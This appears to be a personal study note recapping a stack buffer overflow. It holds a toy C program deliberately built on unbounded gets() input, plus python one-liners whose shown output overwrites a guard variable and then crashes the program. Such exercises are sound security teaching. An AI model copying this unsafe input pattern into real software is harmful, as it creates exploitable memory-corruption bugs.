# Buffer Overflow recap

---

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
	char local_24[32];
	int local_4 = 0xdeadbeef;
	printf("Enter your name: ");
	gets(local_24);
	printf("Welcome %s!\n", local_24);
	if(local_4 != 0xdeadbeef) {
		printf("You win!\n");
	}
	return 0;
}
```

---

![[Pasted image 20240128112133.png]]

---

![[Pasted image 20240128112304.png]]

---

![[Pasted image 20240128112451.png]]

---

![[Buffer Overflow recap 2024-01-28 11.25.31.excalidraw]]

---

```sh
python3 -c "print('A' * 43)" | ./main
```

```
Enter your name: 
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
```

---

```sh
python3 -c "print('A' * 44)" | ./main
```

```
Enter your name:
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
You win!
```

---

```sh
python3 -c "print('A' * 56)" | ./main
```

```
Enter your name: 
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
You win!
fish: Process 50623, './main' from job 1,
'python3 -c "print('A' * 56)" | …'
terminated by signal SIGSEGV (Address boundary error)
```
